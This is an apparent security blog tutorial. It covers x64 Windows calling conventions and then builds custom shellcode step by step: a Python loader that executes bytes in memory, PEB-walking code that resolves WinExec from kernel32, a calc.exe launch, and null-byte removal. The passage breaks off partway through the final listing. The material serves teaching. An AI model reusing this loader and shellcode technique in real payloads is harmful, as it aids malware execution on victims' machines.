---
layout: single
title:  "Custom Shellcode Creation in x64"
date:   2024-05-02 06:48:14 +0100
tags: [posts]
excerpt: "Investigating custom shellcode creation on x64 Windows architectures, also understanding the calling convention in order to obtain a reverse shell"
published: true
---
Introduction
---
This post will discuss creating custom shellcode on x64 architectures. Additionally, the topic of [calling conventions](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170){:target="_blank"} will be explored through a simple C program and visualized with WinDBG.

Calling Conventions
---
### Calling convention defaults
The x64 Application Binary Interface (ABI) employs a fast-call calling convention by default, which uses four registers to pass the initial arguments of a function:

* **Registers Used**: The first four integer arguments of a function are passed using the registers `RCX`, `RDX`, `R8`, and `R9`. For floating-point arguments, `XMM0L`, `XMM1L`, `XMM2L`, and `XMM3L` are used.
* **Shadow Store**: A space is allocated on the call stack, known as shadow store, which allows calls to save these records if needed. A more detailed explanation is given later, in "[What is shadow space](#what-is-shadow-space)".

**Argument Size and Passing Mechanism**

* **Size Constraints**: Any argument that does not fit within 8 bytes, or that isn't of size 1, 2, 4, or 8 bytes, must be passed by reference, which means passing a pointer to the data rather than the data itself.
* **Single Register Rule**: A single argument is never split across multiple registers; it is either fitted into one register or passed by reference if too large.

**Register Volatility and Floating Point Operations**

* **Volatility**: The ABI designates certain registers as volatile, meaning they can be altered across function calls. For integers, `RCX`, `RDX`, `R8`, `R9`, `RAX`, `R10`, and `R11` are volatile. For floating-point operations, `XMM0` to `XMM5` are considered volatile.
* **Floating Point Handling**: The [x87 floating-point stack](https://en.wikipedia.org/wiki/X87){:target="_blank"} is generally unused, with all floating-point operations conducted using the 16 XMM registers to maintain precision and performance.

**Special Considerations for Function Calls**

* **Space Allocation for Parameters**: The caller must allocate space sufficient to store four register parameters on the stack, regardless of how many parameters the callee actually uses. This simplifies handling for various types of functions, including those without prototypes.
* **Varargs and Unprototyped Functions**: For functions with variable arguments or without prototypes, floating-point values must also be duplicated in corresponding general-purpose registers to ensure they are passed correctly.
* **Parameter Conversion**: For prototyped functions, all arguments are converted to the callee's expected types before being passed, ensuring type safety and consistency.

### Alignment
In x64 architecture, most structures adhere to their natural alignment, typically aligned to boundaries that match their sizes (e.g., an `int` might be aligned to 4 bytes). The notable exceptions are:

* **Stack Pointer and Dynamically Allocated Memory**: The stack pointer (`rsp`) and memory allocated via `malloc` or `alloca` are aligned to 16 bytes. This alignment enhances performance, particularly for SIMD operations that require 16-byte alignment.
* **Manual Alignment for Larger Sizes**: Alignments greater than 16 bytes are not automatically ensured and must be manually implemented by the developer. This is particularly relevant when dealing with data structures intended for operations that benefit from or require higher alignments, such as certain SIMD instructions.

### Unwindability
Unwindability refers to the ability to reverse the effects of a function call, crucial for exception handling:

* **Leaf Functions:** These functions do not modify any non-volatile registers or the stack pointer (`rsp`), and thus, are inherently unwindable without additional metadata.
* **Non-Leaf Functions**: These may alter rsp either by calling other functions or allocating space for local variables. To facilitate proper unwinding during exception handling, non-leaf functions must be annotated with static data known as procedure data (`pdata`) which in turn references exception handling data (`xdata`).
* **Prologs and Epilogs**: These parts of functions, which set up and tear down the stack frame, respectively, must adhere to strict rules to maintain 16-byte alignment of the stack and be accurately described by `xdata`. Detailed guidance on the structure of prologs and epilogs can enhance understanding of their critical role in maintaining function integrity across calls.

### Parameter passing
The x64 calling convention optimizes function calls by utilizing registers for the first few arguments and the stack for additional arguments:

* **Registers**: The first four integer arguments are passed in registers `RCX`, `RDX`, `R8`, and `R9`, from left to right. Floating-point arguments within the first four positions are passed in `XMM0` through `XMM3`.
* **Stack**: Arguments beyond the first four are passed on the stack, and all stack-passed arguments are pushed in right-to-left order. This maintains a consistent calling convention across different function calls.
* **Special Handling**: Structures and unions, depending on their size, may be passed directly as integers or via pointers to memory allocated by the caller, which must also be 16-byte aligned. This ensures efficient access and manipulation of data passed to functions.

The following table summarizes how parameters are passed, by type and position from the left:

| Parameter type | fifth and higher | fourth | third | second | leftmost |
|-|-|-|-|-|-|
| floating-point | stack | XMM3 | XMM2 | XMM1 | XMM0 |
| integer | stack | R9 | R8 | RDX | RCX |
| Aggregates (8, 16, 32, or 64 bits) and **`__m64`** | stack | R9 | R8 | RDX | RCX |
| Other aggregates, as pointers | stack | R9 | R8 | RDX | RCX |
| **`__m128`**, as a pointer | stack | R9 | R8 | RDX | RCX |

### Demo

The following C code is created:

```c
#include <stdio.h>

void testFunction(int a, int b, int c, int d, int e, int f, int g) {
    printf("Arguments received in the function: a=%d, b=%d, c=%d, d=%d, e=%d, f=%d, g=%d\n", a, b, c, d, e, f, g);
}

int main() {
    testFunction(1, 2, 3, 4, 5, 6, 7);
    return 0;
}
```

The binary is compiled using `MinGW32`, and the `-g` flag is set to ensure that the executable contains debug information. This information is necessary for setting a breakpoint in the function of interest within WinDBG.
```
root@debian:~# x86_64-w64-mingw32-g++ -g calling_conventions.c -o calling_conventions.exe
root@debian:~# ls
calling_conventions.c  calling_conventions.exe
```
First, a breakpoint is set in the function `testFunction`, which contains the parameters passed to it. Once the breakpoint is created, the program can be resumed. When the breakpoint is reached, the registers are displayed, showing the values 1, 2, 3, and 4 in the corresponding registers (`RCX`, `RDX`, `R8`, and `R9`) respectively.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_18-32.png" alt="">

To display additional values, the stack must be examined. However, it is crucial to consider the stack frame layout and the shadow space that is reserved.

### What is Shadow Space?
Shadow space is an area reserved on the stack immediately preceding the call to a function. In the x64 calling convention, 32 bytes (enough to store four 8-byte registers) are set aside. This space is primarily intended for the called function to optionally save the register values used for passing the first four parameters. Although the called function may not always use this space, it is always allocated by the caller, which influences where on the stack any fifth and subsequent arguments are positioned.

To accurately inspect additional arguments beyond the first four, you must account for this shadow space. Typically, to locate these subsequent arguments, one would start inspecting the stack at `RSP + 32 bytes`. However, in some cases, such as in the presence of function prologues that manipulate the stack further, additional space must be considered.

In this scenario, an additional 8 bytes (bringing the total to 40 bytes, or `28h` in hexadecimal) were added beyond the shadow space to bypass unexpected entries. These entries might include return addresses or runtime setup instructions like those for `atexit`, which are not part of the function's formal parameters but are part of the call stack's state at the function entry point.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_18-39.png" alt="">

After this brief overview of how calling conventions work on Windows, we proceed to the main objective of this post: to create custom shellcode for x64 architectures.

x64 Shellcode Development
---

First of all, a test environment must be created. This requires:

- A virtual machine with Windows 10 installed
- [Python 3.11 in the x64 version](https://www.python.org/downloads/release/python-3110/){:target="_blank"}
- Python module keystone-engine (installable via `pip install keystone-engine`)
- WinDBG (installable via Microsoft Store)
- [Visual Studio Code](https://code.visualstudio.com/){:target="_blank"}

Subsequently, a Python 3 code skeleton is created to compile a set of assembly instructions into executable shellcode using the Keystone assembler. The script allocates memory, executes the shellcode in a new thread, and attaches a debugger (WinDBG) to the process for real-time debugging.

```python
import ctypes, struct
import os
import subprocess
from keystone import *
 
def main():
    SHELLCODE = (
        " start: "
        "   int3;"                       # Breakpoint
        "   nop;"
        "   nop;"
        "   nop;"
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
 
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
```

The first step is to obtain the base address of Kernel32. This involves examining the PEB (Process Environment Block) of the process to identify the base address of the mapped libraries.

Below is a detailed view of the Thread Environment Block (TEB) in WinDBG, showing the location of the Process Environment Block (PEB) pointer at offset `0x60`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_19-26.png" alt="">

In the second screenshot, we focus on the PEB structure, specifically at offset `0x18`, which points to the `PEB_LDR_DATA` structure. This structure plays a crucial role in tracking all the modules (DLLs and EXEs) loaded into the process's address space. The highlighted area reveals the starting address of the `PEB_LDR_DATA`, which is essential for navigating through the list of loaded modules.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_19-27.png" alt="">

The final screenshot illustrates the `PEB_LDR_DATA` structure, zooming into offset `0x20` where the `InMemoryOrderModuleList` is located. This doubly-linked list contains detailed entries for each module loaded in memory, ordered by their memory layout. Highlighted is the start of this list, which typically begins with the kernel32 module.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_19-27_1.png" alt="">

A modification is made to the Python code to include these offsets and store the Kernel32 base address in the `RBX` and `R8` registers.

(*Edited: Thanks to mayh3m for pointing out a mistake in this code*)

```py
" locate_kernel32:"
    "   xor rcx, rcx;"               # Zero out RCX to use it as an offset

    # Get the address of the PEB from the GS segment register.
    # The PEB is located at offset 0x60 from the start of the TEB.
    "   mov rax, gs:[rcx + 0x60];"   # +0x060 PEB

    # Move to the PEB.Ldr field, which is at offset 0x18 in the PEB structure.
    # PEB.Ldr points to the PEB_LDR_DATA structure.
    "   mov rax, [rax + 0x18];"   # +0x018 PEB.Ldr

    # Move to the InMemoryOrderModuleList, which starts at offset 0x20 in the PEB_LDR_DATA.
    # This list contains all loaded modules in the order they are loaded in memory.
    "   mov rsi, [rax + 0x20];"   # +0x020 PEB.Ldr.InMemoryOrderModuleList

    # Load the first entry from the InMemoryOrderModuleList into RAX.
    # The list entry points to the base of the first module.
    "   lodsq;"                      # Loads qword from RSI into RAX

    # Swap RAX and RSI to prepare for the next load operation.
    # This step ensures that RSI points to the next module in the memory order list.
    "   xchg rax, rsi;"              # Swap RAX & RSI

    # Load the second entry from the InMemoryOrderModuleList.
    # This step typically points to the kernel32.dll base since it's usually the first system module loaded.
    "   lodsq;"                      # Loads qword from RSI into RAX

    # Move the base address of kernel32.dll, which is located at offset 0x20 from the module list entry, into RBX.
    "   mov rbx, [rax + 0x20] ;"     # RBX = Kernel32 base address

    # Copy the base address of kernel32.dll to R8 for further use or display.
    "   mov r8, rbx; "               # Copy Kernel32 base address to R8 register
```

### Parsing Kernel32 Export Address Table (EAT)

With the base address of Kernel32 known, the next step is to determine the addresses of the functions to be called by parsing the DLL’s Export Address Table (EAT). The structure of the EAT is represented by the `IMAGE_EXPORT_DIRECTORY` structure as follows:

```cpp
public struct IMAGE_EXPORT_DIRECTORY
{
    public UInt32 Characteristics;
    public UInt32 TimeDateStamp;
    public UInt16 MajorVersion;
    public UInt16 MinorVersion;
    public UInt32 Name;
    public UInt32 Base;
    public UInt32 NumberOfFunctions;
    public UInt32 NumberOfNames;
    public UInt32 AddressOfFunctions;
    public UInt32 AddressOfNames;
    public UInt32 AddressOfNameOrdinals;
}
```

Key fields in this structure are particularly important for understanding how the PE loader performs function lookups:

* **Name:** The name of the DLL.
* **Base:** The number used to adjust the ordinal number to index into the `AddressOfFunctions` array.
* **NumberOfFunctions**: The total number of functions exported, either by name or ordinal.
* **NumberOfNames**: The number of exported names, which might differ from `NumberOfFunctions`. This field only counts functions exported by name. If zero, all functions are exported by ordinal.
* **AddressOfFunctions**: A Relative Virtual Address (RVA) pointing to an array of `DWORD` values, each indicating the RVA to the respective function or a forwarding string for forwarded functions.
* **AddressOfNames**: An RVA pointing to an array of `DWORDs`, each an RVA to the name of an exported function.
* **AddressOfNameOrdinals**: An RVA pointing to an array of `WORDs` representing the export ordinals associated with the names. The values here should be adjusted by the starting ordinal number specified in the `Base` field.

To find the location of the Export Address Table, start by determining the offset to the PE (Portable Executable) signature, which is consistently located at offset 0x03C from the base address of the executable.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_13-02.png" alt="">

When examining the Export Address Table, it's essential to know the current base address of the module in question. This information can be used to navigate to the correct location in memory where the Export Address Table is mapped.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_13-03.png" alt="">

Using WinDBG, the contents of the Export Address Table can be viewed with the display type (`dt`) command, which shows the offsets and structure of the table. To ensure that all necessary debugging symbols are available and correctly loaded during this process, the command `.symopt+0x100` is used. This command enables the `SYMOPT_LOAD_LINES` option, which directs the debugger to load line number information associated with the symbols, enhancing the detail and utility of the debugging session.
Simultaneously, the first entry 'Name' is obtained to verify that the correct DLL is being examined.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_13-05.png" alt="">

Dumping the `AddressOfNames` Relative Virtual Address (RVA) provides the names of the functions exported by the DLL.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_17-06.png" alt="">


Proceeding to demonstrate how to follow these steps in WinDBG to obtain the `NumberOfFunctions` from the EAT.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_17-35.png" alt="">


In total, it is discovered that 1312 functions are exported from Kernel32.

Each command executed will be explained for proper understanding:

* `dd kernel32+0x3c L1`: Offset `0x3c` in the DOS header points to the location of the PE header.
* `dd kernel32+0xf0+0x88 L1`: Get base address of Export Address Table. This command calculates the location of the Export Address Table by adding the offsets:
    - `0xf8` (from DOS header to PE header) + `0x88` (offset to Export Table in Optional Header). It fetches the address at which the Export Table starts within the DLL.
* `dd kernel32+0xf0+0x88+0x14 L1`: It reads the memory `0x14` bytes offset from the start of the Export Address Table, which contains the count of exported functions.

The Python code would look like this:

```
"   mov ebx, [rbx+0x3C]; "          # Get offset to the PE header from the DOS header at offset 0x3C
"   add rbx, r8; "                  # Calculate absolute address of PE header by adding base address of kernel32.dll
"   mov edx, [rbx+0x88];"           # Get Relative Virtual Address (RVA) of Export Address Table from PE header
"   add rdx, r8;"                   # Convert RVA of Export Address Table to absolute address by adding base address
"   mov r10d, [rdx+0x14];"          # Load number of exported functions from Export Address Table
"   xor r11, r11;"                  # Zero out R11 to use it as a clean register
"   mov r11d, [rdx+0x20];"          # Get RVA of the AddressOfNames from the Export Address Table
"   add r11, r8;"                   # Convert AddressOfNames RVA to absolute address by adding base address
```

### Parse AddressOfNames to obtain WinExec

Next, we simply need to loop over the `AddressOfNames` list. We know the length of the list based on the `NumberOfFunctions` field. Once we have found the function we are looking for, we store its index in `RCX` and continue execution.

```
"   mov rcx, r10;"                  # Initialize RCX with the number of functions (loop counter)
"kernel32findfunction: "
" jecxz FunctionNameFound;"         # Jump to FunctionNameFound if RCX is zero (no more functions to check)
"   xor ebx,ebx;"                   # Clear EBX to use as a temporary register
"   mov ebx, [r11+4+rcx*4];"        # Load RVA of current function name into EBX (adjust index as rcx decrements)
"   add rbx, r8;"                   # Convert RVA to absolute address (function name VMA)
"   dec rcx;"                       # Decrement the loop counter
"   mov rax, 0x00636578456E6957;"   # Load the ASCII value of 'WinExec' into RAX for comparison          
"   cmp [rbx], rax;"                # Compare the first eight bytes of the function name at RBX with 'WinExec'
"   jnz kernel32findfunction;"      # If not matched, jump back to start of loop
 
"FunctionNameFound: "
"  nop;"
```

### Finding the WinExec Address

The position where we found the function name in the list will remain stored in the `RCX` register. Following this, we look up the function ordinal based on this index. An ordinal serves as the identifier for a function within a DLL. While we could have conducted a lookup based on this ordinal instead of the function name, it's worth noting that this value might change in future DLL releases.

```
"FunctionNameFound: "
# Entry point after finding the target function name 'WinExec'
"   xor r11, r11;"
"   mov r11d, [rdx+0x24];"          # Load the RVA of the AddressOfNameOrdinals from the Export Table
"   add r11, r8;"                   # Convert RVA to absolute VMA (Virtual Memory Address)
# Incrementing the counter to match the ordinal array index, since we decremented it in the search loop
"   inc rcx;"
"   mov r13w, [r11+rcx*2];"         # Retrieve the function ordinal using the adjusted counter from AddressOfNameOrdinals
# Preparing to fetch the actual function address from AddressOfFunctions
"   xor r11, r11;"
"   mov r11d, [rdx+0x1c];"          # Load the RVA of the AddressOfFunctions from the Export Table
"   add r11, r8;"                   # Convert RVA to absolute VMA where the function addresses are stored
"   mov eax, [r11+r13*4];"          # Fetch the function address RVA using the ordinal as an index
"   add rax, r8;"                   # Convert function address RVA to absolute address
"   mov r14, rax;"                  # Store the resolved function address in R14 for later use
```

### Call WinExec

Once the address of the function is stored in the `R14` register, WinExec can be called. This function requires the following input parameters, taken from the [Microsoft documentation](https://learn.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-winexec){:target="_blank"}.

```cpp
UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
);
```
Where:

* `lpCmdLine` will contain the command we want to execute.
* Following the [documentation](https://learn.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-showwindow){:target="_blank"}, `uCmdShow` will be set to 1, as we want to have a visible window.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_18-14.png" alt="">

Since the function only accepts two input parameters, as seen in the [calling conventions](#calling-conventions) section, we will only need to utilize the `RCX` and `RDX` registers.

```
# WinExec Call
"  xor rax, rax;"                   # Zero RAX to create a null byte
"  push rax;"                       # Push the null byte onto the stack, acts as string terminator for "calc.exe"
"  mov rax, 0x6578652E636C6163;"    # Move the reverse byte-order string 'calc.exe' into RAX
"  push rax;"                       # Push the string 'calc.exe' onto the stack (Note: string must be reversed in memory)
"  mov rcx, rsp;"                   # Set RCX to point to the string "calc.exe" on the stack, RCX is the first argument for WinExec
"  xor rdx, rdx;"                   # Zero out RDX, preparing it for the next operation
"  inc rdx;"                        # Set RDX to 1; this sets uCmdShow parameter for WinExec to SW_SHOWNORMAL
"  sub rsp, 0x20;"                  # Allocate 32 bytes of shadow space on the stack to prevent overwriting during the call
"  call r14;"                       # Call WinExec using the address stored in R14
```

Our code so far:

```python
import ctypes, struct
import os
import subprocess
from keystone import *
 
def main():
    SHELLCODE = (
        " start: "
        "   int3;"                          # Breakpoint
        "  sub rsp, 0x208;"                 # Free up space in the stack
        " locate_kernel32:"
        "   xor rcx, rcx;"                  # Null RCX content
        "   mov rax, gs:[rcx + 0x60];"      # +0x060 PEB
        "   mov rax, [rax + 0x18];"         # +0x018 PEB.Ldr
        "   mov rsi, [rax + 0x20];"         # +0x020 PEB.Ldr.InMemoryOrderModuleList
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   xchg rax, rsi;"                 # Swap RAX & RSI
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
        "   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
        "   mov ebx, [rbx+0x3C]; "          # Get offset to the PE header from the DOS header at offset 0x3C
        "   add rbx, r8; "                  # Calculate absolute address of PE header by adding base address of kernel32.dll
        "   mov edx, [rbx+0x88];"           # Get Relative Virtual Address (RVA) of Export Address Table from PE header
        "   add rdx, r8;"                   # Convert RVA of Export Address Table to absolute address by adding base address
        "   mov r10d, [rdx+0x14];"          # Load number of exported functions from Export Address Table
        "   xor r11, r11;"                  # Zero out R11 to use it as a clean register
        "   mov r11d, [rdx+0x20];"          # Get RVA of the AddressOfNames from the Export Address Table
        "   add r11, r8;"                   # Convert AddressOfNames RVA to absolute address by adding base address
        "   mov rcx, r10;"                  # Initialize RCX with the number of functions (loop counter)
        "kernel32findfunction: "
        " jecxz FunctionNameFound;"         # Jump to FunctionNameFound if RCX is zero (no more functions to check)
        "   xor ebx,ebx;"                   # Clear EBX to use as a temporary register
        "   mov ebx, [r11+4+rcx*4];"        # Load RVA of current function name into EBX (adjust index as rcx decrements)
        "   add rbx, r8;"                   # Convert RVA to absolute address (function name VMA)
        "   dec rcx;"                       # Decrement the loop counter
        "   mov rax, 0x00636578456E6957;"   # Load the ASCII value of 'WinExec' into RAX for comparison          
        "   cmp [rbx], rax;"                # Compare the first eight bytes of the function name at RBX with 'WinExec'
        "   jnz kernel32findfunction;"      # If not matched, jump back to start of loop
        "FunctionNameFound: "
        # Entry point after finding the target function name 'WinExec'
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x24];"          # Load the RVA of the AddressOfNameOrdinals from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA (Virtual Memory Address)
        # Incrementing the counter to match the ordinal array index, since we decremented it in the search loop
        "   inc rcx;"
        "   mov r13w, [r11+rcx*2];"         # Retrieve the function ordinal using the adjusted counter from AddressOfNameOrdinals
        # Preparing to fetch the actual function address from AddressOfFunctions
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x1c];"          # Load the RVA of the AddressOfFunctions from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA where the function addresses are stored
        "   mov eax, [r11+4+r13*4];"          # Fetch the function address RVA using the ordinal as an index
        "   add rax, r8;"                   # Convert function address RVA to absolute address
        "   mov r14, rax;"                  # Store the resolved function address in R14 for later use
        # WinExec Call
        "  xor rax, rax;"                   # Zero RAX to create a null byte
        "  push rax;"                       # Push the null byte onto the stack, acts as string terminator for "calc.exe"
        "  mov rax, 0x6578652E636C6163;"    # Move the reverse byte-order string 'calc.exe' into RAX
        "  push rax;"                       # Push the string 'calc.exe' onto the stack (Note: string must be reversed in memory)
        "  mov rcx, rsp;"                   # Set RCX to point to the string "calc.exe" on the stack, RCX is the first argument for WinExec
        "  xor rdx, rdx;"                   # Zero out RDX, preparing it for the next operation
        "  inc rdx;"                        # Set RDX to 1; this sets uCmdShow parameter for WinExec to SW_SHOWNORMAL
        "  sub rsp, 0x20;"                  # Allocate 32 bytes of shadow space on the stack to prevent overwriting during the call
        "  call r14;"                       # Call WinExec using the address stored in R14
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
 
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
```

When executing the script, an access violation is observed due to the presence of null bytes (`0x00`) within our shellcode.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_18-20.png" alt="">

### Removing Null Bytes

To solve this problem, alternative instructions that lead to the same result must be used. For example, rather than subtracting, adding a negative number to a register achieves the same effect.

The first identified instruction containing nullbytes is `sub rsp, 0x208`.

```
0:003> ? 0x208
Evaluate expression: 520 = 00000000`00000208
```

The same technique as mentioned above is used. First, it is verified that `-0x208` does not contain a nullbyte.

```
0:003> ? -0x208
Evaluate expression: -520 = ffffffff`fffffdf8
```
Therefore the instruction is modified to `add rsp, 0xfffffffffffffdf8`.

The next problem encountered is the instruction `mov edx, [rbx+0x88];"`.

```
0:003> ? 0x88
Evaluate expression: 136 = 00000000`00000088
```

In this case, our approach involves selecting a larger initial value that, when bit-shifted, achieves the desired offset, thereby allowing us to trim off any unnecessary characters. Therefore, a left-shift of the initial value with 20 bits (`0x14`) will be performed.

```
0:003> ? 0x88 << 0x14
Evaluate expression: 142606336 = 00000000`08800000
```

Then, a bitwise OR with `0xFFFFF` is applied to fill the lower bits, modifying the byte pattern without affecting the shifted value:

```
0:003> ? (00000000`08800000|0xFFFFF)
Evaluate expression: 143654911 = 00000000`088fffff
```

Finally, the operation is confirmed by shifting the same 20 bits (`0x14`) to the right, ensuring that the significant bits return to the original value:

```
0:003> ? 0x00000000`088fffff >> 14
Evaluate expression: 136 = 00000000`00000088
```

This is incorporated into our code as follows:

```
xor r12, r12;              # Zero out r12 to start fresh
add r12, 0x88FFFFF;        # Load r12 with a large number
shr r12, 0x14;             # Right-shift r12 by 20 bits to get 0x88
mov edx, [rbx+r12];        # Move the value at rbx+0x88 into edx
```

The last problem we ran into is the following step when trying to move *WinExec* string to the `rax` registry.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_19-40.png" alt="">

The same procedure as mentioned above is followed:

```
0:003> ? 0x00636578456E6957 << 8
Evaluate expression: 7162263022003115776 = 63657845`6e695700
0:003> ? (63657845`6e695700|0xFF)
Evaluate expression: 7162263022003116031 = 63657845`6e6957ff
0:003> ? 63657845`6e6957ff >> 8
Evaluate expression: 27977589929699671 = 00636578`456e6957
```

The code to add to the script is the following:

```
"   mov rax, 0x636578456E6957FF;"   # Load the calculated initial value
"   shr rax, 0x8;"                  # Shift right by 8 bits to get the desired WinExec string
```

### Final Code

```
import ctypes, struct
import os
import subprocess
from keystone import *
 
def main():
    SHELLCODE = (
        " start: "
        # "   int3;"                        # Breakpoint
        # "  sub rsp, 0x208;"               # Free up space in the stack (Null Byte)
        "   add rsp, 0xfffffffffffffdf8;"   # Free up space in the stack (Fix)
        " locate_kernel32:"
        "   xor rcx, rcx;"                  # Null RCX content
        "   mov rax, gs:[rcx + 0x60];"      # +0x060 PEB
        "   mov rax, [rax + 0x18];"         # +0x018 PEB.Ldr
        "   mov rsi, [rax + 0x20];"         # +0x020 PEB.Ldr.InMemoryOrderModuleList
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   xchg rax, rsi;"                 # Swap RAX & RSI
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   mov rbx, [rax + 0x20];"         # RBX = Kernel32 base address
        "   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
        "   mov ebx, [rbx+0x3C];"           # Get offset to the PE header from the DOS header at offset 0x3C
        "   add rbx, r8; "                  # Calculate absolute address of PE header by adding base address of kernel32.dll
        # "   mov edx, [rbx+0x88];"         # Get Relative Virtual Address (RVA) of Export Address Table from PE header (Null Byte)
        # Fix below
        "   xor r12, r12;"                  # Zero out r12 to start fresh
        "   add r12, 0x88FFFFF;"            # Load r12 with a large number
        "   shr r12, 0x14;"                 # Right-shift r12 by 20 bits to get 0x88
        "   mov edx, [rbx+r12];"            # Move the value at rbx+0x88 into edx
        "   add rdx, r8;"                   # Convert RVA of Export Address Table to absolute address by adding base address
        "   mov r10d, [rdx+0x14];"          # Load number of exported functions from Export Address Table
        "   xor r11, r11;"                  # Zero out R11 to use it as a clean register
        "   mov r11d, [rdx+0x20];"          # Get RVA of the AddressOfNames from the Export Address Table
        "   add r11, r8;"                   # Convert AddressOfNames RVA to absolute address by adding base address
        "   mov rcx, r10;"                  # Initialize RCX with the number of functions (loop counter)
        "kernel32findfunction: "
        " jecxz FunctionNameFound;"         # Jump to FunctionNameFound if RCX is zero (no more functions to check)
        "   xor ebx,ebx;"                   # Clear EBX to use as a temporary register
        "   mov ebx, [r11+4+rcx*4];"        # Load RVA of current function name into EBX (adjust index as rcx decrements)
        "   add rbx, r8;"                   # Convert RVA to absolute address (function name VMA)
        "   dec rcx;"                       # Decrement the loop counter
        #"   mov rax, 0x00636578456E6957;"  # Load the ASCII value of 'WinExec' into RAX for comparison          
        # Fix below
        "   mov rax, 0x636578456E6957FF;"   # Load the calculated initial value
        "   shr rax, 0x8;"                  # Shift right by 8 bits to get the desired WinExec string
        "   cmp [rbx], rax;"                # Compare the first eight bytes of the function name at RBX with 'WinExec'
        "   jnz kernel32findfunction;"      # If not matched, jump back to start of loop
        "FunctionNameFound: "
        # Entry point after finding the target function name 'WinExec'
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x24];"          # Load the RVA of the AddressOfNameOrdinals from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA (Virtual Memory Address)
        # Incrementing the counter to match the ordinal array index, since we decremented it in the search loop
        "   inc rcx;"
        "   mov r13w, [r11+rcx*2];"         # Retrieve the function ordinal using the adjusted counter from AddressOfNameOrdinals
        # Preparing to fetch the actual function address from AddressOfFunctions
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x1c];"          # Load the RVA of the AddressOfFunctions from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA where the function addresses are stored
        "   mov eax, [r11+4+r13*4];"        # Fetch the function address RVA using the ordinal as an index
